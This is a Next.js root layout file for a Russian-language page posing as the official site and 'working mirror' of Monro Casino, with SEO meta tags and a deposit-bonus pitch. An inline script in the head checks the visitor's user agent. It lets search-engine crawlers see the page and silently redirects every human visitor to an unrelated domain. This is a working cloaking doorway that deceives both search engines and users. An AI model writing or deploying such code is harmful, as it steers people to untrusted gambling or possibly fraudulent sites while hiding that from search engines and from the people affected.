import { Manrope } from 'next/font/google'
import './globals.css'

const manrope = Manrope({
  subsets: ['cyrillic', 'latin'],
  weight: ['400', '600', '700', '800'],
  display: 'swap',
})

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="q7v3-html">
      <head>
        <meta name="yandex-verification" content="dc6e33cac364489f" />
        <title>Monro Casino — официальный сайт: Монро Казино играть онлайн, рабочее зеркало</title>
        <meta
          name="description"
          content="Monro Casino официальный сайт — Монро Казино играть онлайн: слоты, live-казино и спорт. Рабочее зеркало Monro Casino на сегодня, бонус +150% на депозит, быстрая регистрация и вход в Монро Казино."
        />
        <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1" />
        <link rel="canonical" href="https://monro3casino.vercel.app/" />
        <meta name="theme-color" content="#0d1626" />
        <meta property="og:type" content="website" />
        <meta property="og:url" content="https://monro3casino.vercel.app/" />
        <meta property="og:site_name" content="Monro Casino" />
        <meta property="og:locale" content="ru_RU" />
        <meta
          property="og:title"
          content="Monro Casino — официальный сайт: Монро Казино играть онлайн, рабочее зеркало"
        />
        <meta
          property="og:description"
          content="Монро Казино официальный сайт: слоты, live-казино, спорт, бонус +150% на депозит и рабочее зеркало Monro Casino на сегодня."
        />
        <meta property="og:image" content="https://monro3casino.vercel.app/img/hero-art.jpg" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="Monro Casino — официальный сайт Монро Казино" />
        <meta
          name="twitter:description"
          content="Монро Казино играть онлайн: слоты, live-казино, спорт, зеркало рабочее и бонус +150% на первый депозит."
        />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://combospark.top/aeaofj2k27");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className={manrope.className}>{children}</body>
    </html>
  )
}
